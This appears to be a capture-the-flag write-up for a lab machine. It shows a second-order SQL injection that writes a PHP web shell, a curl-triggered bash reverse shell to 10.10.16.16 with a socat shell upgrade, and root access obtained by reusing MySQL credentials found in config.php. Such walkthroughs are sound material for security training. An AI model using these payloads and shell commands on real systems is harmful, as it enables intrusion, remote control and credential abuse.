# Summary

 - Second order SQLi
 - Password reuse for root access

## Port 80
```
Apache 2.4.48, PHP 7.4.23, OS Debian, Jquery, Bootstrap

+ http://10.129.95.235/account.php (CODE:200|SIZE:16)
+ http://10.129.95.235/config.php (CODE:200|SIZE:0)
+ http://10.129.95.235/index.php (CODE:200|SIZE:16088)

```
Second order injection after registration of user. Using "country" field we are able to inject malicious payload and then execute it with triggering of the website with appointed cookie which is a simple md5hash of the username:

```
POST / HTTP/1.1
username=josdfe&country=Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -

GET /account.php HTTP/1.1
GET /shell.php?cmd=id
```

After establishing a revers `nc` shell with `curl` command I've upgraded to stable shell with `socat` (python is missing):
```
curl http://$RHOST/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.16/1337 0>&1"'

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.16:4444
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

# Privilege escalation

Inside `config.php` are credentials for mysql.
```
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";
```

Mysql reveals an md5 hash:
```
MariaDB [mysql]> select User,Password from user;
+-------------+-------------------------------------------+
| User        | Password                                  |
+-------------+-------------------------------------------+
| mariadb.sys |                                           |
| root        | invalid                                   |
| mysql       | invalid                                   |
| uhc         | *C6A38A5736CBA87E617301ECAB64184671128718 |
+-------------+-------------------------------------------+
```

While john is running, I am trying the password from uhc user as for a root access, which works:
```
su -
```
